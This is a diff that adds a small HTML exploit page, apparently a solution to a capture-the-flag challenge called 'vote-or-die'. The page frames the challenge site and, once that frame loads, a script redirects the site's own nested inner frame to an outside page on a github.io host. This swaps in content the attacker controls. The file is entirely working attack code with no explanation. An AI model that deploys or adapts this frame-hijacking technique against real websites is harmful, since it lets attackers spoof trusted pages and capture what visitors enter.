@@ -1,0 +1,13 @@
+<html>
+  <head>
+    <title>Op</title>
+      <script>
+        function onIframeLoad() {
+            window.frames[0].frames[0].location.replace('https://ruslankerimov.github.io/op_inner_frame.html');
+        }
+    </script>
+  </head>
+  <body>
+    <iframe src="https://vote-or-die.yactf.ru" onload="onIframeLoad()" />
+  </body>
+</html>
